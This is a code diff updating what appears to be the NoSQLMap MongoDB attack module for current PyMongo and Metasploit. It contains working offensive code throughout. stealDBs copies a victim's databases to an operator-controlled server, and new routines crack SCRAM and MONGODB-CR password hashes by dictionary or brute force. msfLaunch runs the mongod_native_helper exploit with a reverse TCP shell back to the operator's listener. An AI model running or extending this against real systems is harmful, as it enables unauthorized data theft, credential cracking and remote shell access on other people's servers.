@@ -5,12 +5,17 @@
 from .exception import NoSQLMapException
 import pymongo
 import urllib.request
+import urllib.parse
+import urllib.error
 import json
 import gridfs
 import itertools
 import string
 import subprocess
+import hashlib
 from hashlib import md5
+import hmac
+import base64
 import os
 
 
@@ -36,7 +41,7 @@ def netAttacks(target, dbPort, myIP, myPort, args = None):
     needCreds = mongoScan(target,dbPort,False)
 
     if needCreds[0] == 0:
-        conn = pymongo.MongoClient(target,dbPort)
+        conn = pymongo.MongoClient(target, dbPort, serverSelectionTimeoutMS=4000)
         print("Successful access with no credentials!")
         mgtOpen = True
 
@@ -44,18 +49,21 @@ def netAttacks(target, dbPort, myIP, myPort, args = None):
         print("Login required!")
         srvUser = input("Enter server username: ")
         srvPass = input("Enter server password: ")
-        uri = "mongodb://" + srvUser + ":" + srvPass + "@" + target +"/"
+        uri = "mongodb://" + urllib.parse.quote_plus(srvUser) + ":" + urllib.parse.quote_plus(srvPass) + "@" + target + ":" + str(dbPort) + "/"
 
         try:
-            conn = pymongo.MongoClient(target)
-            print("MongoDB authenticated on " + target + ":27017!")
+            conn = pymongo.MongoClient(uri, serverSelectionTimeoutMS=4000)
+            # MongoClient is lazy; force an authenticated round-trip so we only
+            # report success when the credentials actually work.
+            conn.admin.command("ping")
+            print("MongoDB authenticated on " + target + ":" + str(dbPort) + "!")
             mgtOpen = True
-        except NoSQLMapException:
+        except pymongo.errors.PyMongoError:
             input("Failed to authenticate.  Press enter to continue...")
             return
 
     elif needCreds[0] == 2:
-        conn = pymongo.MongoClient(target,dbPort)
+        conn = pymongo.MongoClient(target, dbPort, serverSelectionTimeoutMS=4000)
         print("Access check failure.  Testing will continue but will be unreliable.")
         mgtOpen = True
 
@@ -68,31 +76,31 @@ def netAttacks(target, dbPort, myIP, myPort, args = None):
     # Future rev:  Add web management interface parsing
 
     try:
-        mgtRespCode = urllib.request.urlopen(mgtUrl).getcode()
+        mgtRespCode = urllib.request.urlopen(mgtUrl, timeout=5).getcode()
         if mgtRespCode == 200:
             print("MongoDB web management open at " + mgtUrl + ".  No authentication required!")
             testRest = input("Start tests for REST Interface (y/n)? ")
 
-        if testRest in yes_tag:
-            restUrl = mgtUrl + "/listDatabases?text=1"
-            restResp = urllib.request.urlopen(restUrl).read().decode()
-            restOn = restResp.find('REST is not enabled.')
+            if testRest in yes_tag:
+                restUrl = mgtUrl + "/listDatabases?text=1"
+                restResp = urllib.request.urlopen(restUrl, timeout=5).read().decode()
+                restOn = restResp.find('REST is not enabled.')
 
-            if restOn == -1:
-                print("REST interface enabled!")
-                dbs = json.loads(restResp)
-                menuItem = 1
-                print("List of databases from REST API:")
+                if restOn == -1:
+                    print("REST interface enabled!")
+                    dbs = json.loads(restResp)
+                    menuItem = 1
+                    print("List of databases from REST API:")
 
-                for x in range(0,len(dbs['databases'])):
-                    dbTemp= dbs['databases'][x]['name']
-                    print(str(menuItem) + "-" + dbTemp)
-                    menuItem += 1
-            else:
-                print("REST interface not enabled.")
-            print("\n")
+                    for x in range(0,len(dbs['databases'])):
+                        dbTemp= dbs['databases'][x]['name']
+                        print(str(menuItem) + "-" + dbTemp)
+                        menuItem += 1
+                else:
+                    print("REST interface not enabled.")
+                print("\n")
 
-    except NoSQLMapException:
+    except (urllib.error.URLError, urllib.error.HTTPError, OSError, json.JSONDecodeError, KeyError, IndexError, TypeError):
         print("MongoDB web management closed or requires authentication.")
 
     if mgtOpen == True:
@@ -120,15 +128,12 @@ def netAttacks(target, dbPort, myIP, myPort, args = None):
                 enumGrid(conn)
 
             if attack == "4":
-                if myIP == "Not Set":
-                    print("Target database not set!")
-                else:
-                    print("\n")
-                    stealDBs(myIP,target,conn)
+                print("\n")
+                stealDBs(myIP,target,conn)
 
             if attack == "5":
                 print("\n")
-                msfLaunch()
+                msfLaunch(target, myIP, myPort)
 
             if attack == "6":
                 return
@@ -136,7 +141,6 @@ def netAttacks(target, dbPort, myIP, myPort, args = None):
 
 def stealDBs(myDB,victim,mongoConn):
     dbList = mongoConn.list_database_names()
-    dbLoot = True
     menuItem = 1
 
     if len(dbList) == 0:
@@ -147,35 +151,25 @@ def stealDBs(myDB,victim,mongoConn):
         print(str(menuItem) + "-" + dbName)
         menuItem += 1
 
-    while dbLoot:
+    while True:
         dbLoot = input("Select a database to steal: ")
-
-        if int(dbLoot) >= menuItem:
-            print("Invalid selection.")
-
-        else:
+        if dbLoot.isdigit() and 1 <= int(dbLoot) < menuItem:
             break
+        print("Invalid selection.")
 
     try:
-        dbNeedCreds = input("Does this database require credentials (y/n)? ")
-        myDBConn = pymongo.MongoClient(myDB, 27017)
+        # Clone destination is a MongoDB you control.  Default to the configured
+        # listener IP but let the operator override host and port (the old code
+        # silently reused the shell-listener IP and hardcoded port 27017).
+        destHost = input("Destination MongoDB host [" + str(myDB) + "]: ").strip() or str(myDB)
+        destPort = input("Destination MongoDB port [27017]: ").strip() or "27017"
+        myDBConn = pymongo.MongoClient(destHost, int(destPort), serverSelectionTimeoutMS=4000)
 
-        # copy_database was removed in PyMongo 4.x; manually copy collections
+        # copy_database was removed in PyMongo 4.x; copy collections manually,
+        # reusing the already-authenticated source connection.
         srcDBName = dbList[int(dbLoot)-1]
         dstDBName = srcDBName + "_stolen"
-
-        if dbNeedCreds in no_tag:
-            srcConn = pymongo.MongoClient(victim, 27017)
-        elif dbNeedCreds in yes_tag:
-            dbUser = input("Enter database username: ")
-            dbPass = input("Enter database password: ")
-            srcConn = pymongo.MongoClient(victim, 27017, username=dbUser, password=dbPass, authSource=srcDBName)
-        else:
-            input("Invalid Selection.  Press enter to continue.")
-            stealDBs(myDB,victim,mongoConn)
-            return
-
-        srcDB = srcConn[srcDBName]
+        srcDB = mongoConn[srcDBName]
         dstDB = myDBConn[dstDBName]
 
         for coll_name in srcDB.list_collection_names():
@@ -185,28 +179,23 @@ def stealDBs(myDB,victim,mongoConn):
             if docs:
                 dstDB[coll_name].insert_many(docs)
 
-        srcConn.close()
+        myDBConn.close()
 
         cloneAnother = input("Database cloned.  Copy another (y/n)? ")
-
         if cloneAnother in yes_tag:
             stealDBs(myDB,victim,mongoConn)
-
         else:
             return
 
-    except NoSQLMapException as e:
-        if str(e).find('text search not enabled') != -1:
-            input("Database copied, but text indexing was not enabled on the target.  Indexes not moved.  Press enter to return...")
-            return
-        elif str(e).find('Network is unreachable') != -1:
-            input("Are you sure your network is unreachable? Press enter to return..")
-        else:
-            input("Something went wrong.  Are you sure your MongoDB is running and options are set? Press enter to return...")
-            return
+    except ValueError:
+        input("Invalid destination port.  Press enter to return...")
+        return
+    except pymongo.errors.PyMongoError as e:
+        input("Something went wrong cloning the database (" + str(e) + ").  Press enter to return...")
+        return
 
 
-def passCrack (user, encPass):
+def passCrack (user, cred):
     select = True
     print("Select password cracking method: ")
     print("1-Dictionary Attack")
@@ -218,26 +207,72 @@ def passCrack (user, encPass):
         select = input("Selection: ")
         if select == "1":
             select = False
-            dict_pass(user,encPass)
+            dict_pass(user, cred)
 
         elif select == "2":
             select = False
-            brute_pass(user,encPass)
+            brute_pass(user, cred)
 
         elif select == "3":
             return
     return
 
 
-def gen_pass(user, passw, hashVal):
-    if md5((user + ":mongo:" + str(passw)).encode()).hexdigest() == hashVal:
+def _check_pw(user, candidate, cred):
+    # cred is either a legacy MONGODB-CR md5 hex string, or a SCRAM credential
+    # dict {'mech','salt','iterations','storedKey'} from a modern user document.
+    if isinstance(cred, dict):
+        return _scram_match(user, candidate, cred)
+    return md5((user + ":mongo:" + str(candidate)).encode()).hexdigest() == cred
+
+
+def _scram_match(user, candidate, cred):
+    # Recompute the SCRAM storedKey for a candidate and compare.  MongoDB's
+    # SCRAM-SHA-1 uses the hex MONGODB-CR digest as the PBKDF2 secret, while
+    # SCRAM-SHA-256 uses the (SASLprep'd) password directly.
+    try:
+        salt = base64.b64decode(cred["salt"])
+        iterations = int(cred["iterations"])
+        if cred.get("mech") == "SCRAM-SHA-256":
+            secret = str(candidate).encode("utf-8")
+            algo = "sha256"
+        else:
+            secret = md5((user + ":mongo:" + str(candidate)).encode()).hexdigest().encode("utf-8")
+            algo = "sha1"
+        salted = hashlib.pbkdf2_hmac(algo, secret, salt, iterations)
+        clientKey = hmac.new(salted, b"Client Key", algo).digest()
+        storedKey = hashlib.new(algo, clientKey).digest()
+        return base64.b64encode(storedKey).decode() == cred["storedKey"]
+    except (ValueError, KeyError, TypeError):
+        return False
+
+
+def _extract_cred(userDoc):
+    # Return a legacy MONGODB-CR md5 hex string, a SCRAM cred dict, or None.
+    if "pwd" in userDoc:
+        return userDoc["pwd"]
+    creds = userDoc.get("credentials", {})
+    for mech in ("SCRAM-SHA-256", "SCRAM-SHA-1"):
+        if mech in creds:
+            c = creds[mech]
+            return {
+                "mech": mech,
+                "salt": c.get("salt", ""),
+                "iterations": int(c.get("iterationCount", 0)),
+                "storedKey": c.get("storedKey", ""),
+            }
+    return None
+
+
+def gen_pass(user, passw, cred):
+    if _check_pw(user, passw, cred):
         print("Found - " + user + ":" + passw)
         return True
     else:
         return False
 
 
-def dict_pass(user,key):
+def dict_pass(user, cred):
     loadCheck = False
 
     while loadCheck == False:
@@ -246,13 +281,13 @@ def dict_pass(user,key):
             with open (dictionary) as f:
                    passList = f.readlines()
             loadCheck = True
-        except NoSQLMapException:
+        except OSError:
             print(" Couldn't load file.")
 
     print("Running dictionary attack...")
     for passGuess in passList:
-        temp = passGuess.split("\n")[0]
-        gotIt = gen_pass (user, temp, key)
+        temp = passGuess.rstrip("\n")
+        gotIt = gen_pass (user, temp, cred)
 
         if gotIt == True:
             break
@@ -263,8 +298,7 @@ def genBrute(chars, maxLen):
     return (''.join(candidate) for candidate in itertools.chain.from_iterable(itertools.product(chars, repeat=i) for i in range(1, maxLen + 1)))
 
 
-def brute_pass(user,key):
-    charSel = True
+def brute_pass(user, cred):
     print("\n")
     maxLen = input("Enter the maximum password length to attempt: ")
     print("1-Lower case letters")
@@ -292,12 +326,21 @@ def brute_pass(user,key):
 
     elif charSel == "6":
         chainSet = string.ascii_letters + string.digits + "!@#$%^&*()-_+={}[]|~`':;<>,.?/"
+
+    else:
+        print("Invalid character set selection.")
+        return
+
+    if not maxLen.isdigit():
+        print("Maximum length must be a number.")
+        return
+
     count = 0
     print("\n", end="")
     for attempt in genBrute (chainSet,int(maxLen)):
-        print("\rCombinations tested: " + str(count) + "\r")
+        print("\rCombinations tested: " + str(count), end="")
         count += 1
-        if md5((user + ":mongo:" + str(attempt)).encode()).hexdigest() == key:
+        if _check_pw(user, attempt, cred):
             print("\nFound - " + user + ":" + attempt)
             break
     return
@@ -305,9 +348,13 @@ def brute_pass(user,key):
 
 def getPlatInfo (mongoConn):
     print("Server Info:")
-    print("MongoDB Version: " + mongoConn.server_info()['version'])
-    print("Debugs enabled : " + str(mongoConn.server_info()['debug']))
-    print("Platform: " + str(mongoConn.server_info()['bits']) + " bit")
+    try:
+        info = mongoConn.server_info()
+        print("MongoDB Version: " + str(info.get('version', 'unknown')))
+        print("Debugs enabled : " + str(info.get('debug', False)))
+        print("Platform: " + str(info.get('bits', '?')) + " bit")
+    except pymongo.errors.PyMongoError as e:
+        print("Couldn't retrieve server info: " + str(e))
     print("\n")
     return
 
@@ -318,7 +365,7 @@ def enumDbs (mongoConn):
         print("\n".join(mongoConn.list_database_names()))
         print("\n")
 
-    except NoSQLMapException:
+    except pymongo.errors.PyMongoError:
         print("Error:  Couldn't list databases.  The provided credentials may not have rights.")
 
     print("List of collections:")
@@ -334,16 +381,26 @@ def enumDbs (mongoConn):
                 users = list(db.system.users.find())
                 print("Database Users and Password Hashes:")
 
-                for x in range (0,len(users)):
-                    print("Username: " + users[x]['user'])
-                    print("Hash: " + users[x]['pwd'])
+                for user in users:
+                    uname = user.get('user', '?')
+                    cred = _extract_cred(user)
+                    print("Username: " + uname)
+                    if cred is None:
+                        print("Hash: (unrecognised credential format)")
+                        print("\n")
+                        continue
+                    if isinstance(cred, str):
+                        print("Hash (MONGODB-CR): " + cred)
+                    else:
+                        print("Credential: " + cred['mech'] + " iterations=" + str(cred['iterations']))
+                        print("storedKey: " + cred['storedKey'] + "  salt: " + cred['salt'])
                     print("\n")
                     crack = input("Crack this hash (y/n)? ")
 
                     if crack in yes_tag:
-                        passCrack(users[x]['user'],users[x]['pwd'])
+                        passCrack(uname, cred)
 
-    except NoSQLMapException as e:
+    except pymongo.errors.PyMongoError as e:
         print(e)
         print("Error:  Couldn't list collections.  The provided credentials may not have rights.")
 
@@ -352,11 +409,16 @@ def enumDbs (mongoConn):
 
 
 def msfLaunch(victim, myIP, myPort):
+    # msfcli was removed from Metasploit in 2015; drive msfconsole instead.
+    resource = ("use exploit/linux/misc/mongod_native_helper; "
+                "set RHOST %s; set DB local; "
+                "set PAYLOAD linux/x86/shell/reverse_tcp; "
+                "set LHOST %s; set LPORT %s; run" % (victim, myIP, myPort))
     try:
-        proc = subprocess.call(["msfcli", "exploit/linux/misc/mongod_native_helper", "RHOST=%s" % victim, "DB=local", "PAYLOAD=linux/x86/shell/reverse_tcp", "LHOST=%s" % myIP, "LPORT=%s" % myPort, "E"])
+        subprocess.call(["msfconsole", "-q", "-x", resource])
 
-    except NoSQLMapException:
-        print("Something went wrong.  Make sure Metasploit is installed and path is set, and all options are defined.")
+    except (OSError, subprocess.SubprocessError):
+        print("Something went wrong.  Make sure Metasploit (msfconsole) is installed and on PATH, and all options are defined.")
     input("Press enter to continue...")
     return
 
@@ -367,15 +429,19 @@ def enumGrid (mongoConn):
             try:
                 db = mongoConn[dbItem]
                 fs = gridfs.GridFS(db)
-                files = fs.list()
-                print("GridFS enabled on database " + str(dbItem))
-                print(" list of files:")
-                print("\n".join(files))
+                # GridFS.list() was removed in PyMongo 4; enumerate via find().
+                files = [f.filename for f in fs.find() if getattr(f, 'filename', None)]
+                if files:
+                    print("GridFS enabled on database " + str(dbItem))
+                    print(" list of files:")
+                    print("\n".join(files))
+                else:
+                    print("GridFS not enabled on " + str(dbItem) + ".")
 
-            except NoSQLMapException:
+            except pymongo.errors.PyMongoError:
                 print("GridFS not enabled on " + str(dbItem) + ".")
 
-    except NoSQLMapException:
+    except pymongo.errors.PyMongoError:
         print("Error:  Couldn't enumerate GridFS.  The provided credentials may not have rights.")
 
     return
@@ -384,50 +450,26 @@ def enumGrid (mongoConn):
 def mongoScan(ip,port,pingIt):
 
     if pingIt == True:
-        test = os.system("ping -c 1 -n -W 1 " + ip + ">/dev/null")
+        # argv form (no shell) so a hostile entry in a scanned IP list cannot
+        # inject shell commands onto the operator's box.
+        test = subprocess.call(["ping", "-c", "1", "-n", "-W", "1", ip],
+                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        if test != 0:
+            return [4, None]
 
-        if test == 0:
-            try:
-                conn = pymongo.MongoClient(ip,port,connectTimeoutMS=4000,socketTimeoutMS=4000)
+    try:
+        conn = pymongo.MongoClient(ip, port, connectTimeoutMS=4000, socketTimeoutMS=4000, serverSelectionTimeoutMS=4000)
+        dbList = conn.list_database_names()
+        dbVer = conn.server_info()['version']
+        conn.close()
+        return [0, dbVer]
 
-                try:
-                    dbList = conn.list_database_names()
-                    dbVer = conn.server_info()['version']
-                    conn.close()
-                    return [0,dbVer]
+    except pymongo.errors.OperationFailure:
+        # Authentication required / not authorized.
+        return [1, None]
 
-                except NoSQLMapException:
-                    if str(sys.exc_info()).find('need to login') != -1:
-                        conn.close()
-                        return [1,None]
+    except (pymongo.errors.ServerSelectionTimeoutError, pymongo.errors.ConnectionFailure):
+        return [3, None]
 
-                    else:
-                        conn.close()
-                        return [2,None]
-
-            except NoSQLMapException:
-                return [3,None]
-
-        else:
-            return [4,None]
-    else:
-        try:
-            conn = pymongo.MongoClient(ip,port,connectTimeoutMS=4000,socketTimeoutMS=4000)
-
-            try:
-                dbList = conn.list_database_names()
-                dbVer = conn.server_info()['version']
-                conn.close()
-                return [0,dbVer]
-
-            except NoSQLMapException as e:
-                if str(e).find('need to login') != -1:
-                    conn.close()
-                    return [1,None]
-
-                else:
-                    conn.close()
-                    return [2,None]
-
-        except NoSQLMapException:
-            return [3,None]
+    except pymongo.errors.PyMongoError:
+        return [2, None]
